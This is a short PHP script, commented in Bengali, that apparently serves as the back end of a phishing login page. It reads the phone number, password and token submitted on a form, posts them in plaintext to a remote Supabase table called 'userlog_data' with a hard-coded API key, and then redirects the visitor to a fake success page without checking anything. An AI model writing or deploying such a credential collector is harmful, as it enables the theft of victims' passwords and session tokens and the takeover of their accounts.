<?php
// Supabase এর তথ্যগুলো এখানে দিন
$supabaseUrl = "https://hglekeepnigvpvsvazdb.supabase.co/rest/v1/userlog_data"; // আপনার প্রজেক্ট URL বসান
$apiKey = "sb_publishable_BYyYGnXd6L5YY_O8tnp2IQ_DtORlYVF"; // আপনার Publishable Key বসান

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ফর্ম থেকে আসা ডাটা
    $data = [
        "phone"    => isset($_POST['phone']) ? $_POST['phone'] : "",
        "password" => isset($_POST['password']) ? $_POST['password'] : "",
        "token"    => isset($_POST['token']) ? $_POST['token'] : ""
    ];

    // cURL দিয়ে ডাটা পাঠানো
    $ch = curl_init($supabaseUrl);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . $apiKey,
        'Authorization: Bearer ' . $apiKey,
        'Content-Type: application/json',
        'Prefer: return=representation'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // সফল হলে রিডাইরেক্ট
    header("Location: index.html?status=success");
    exit();
}
?>
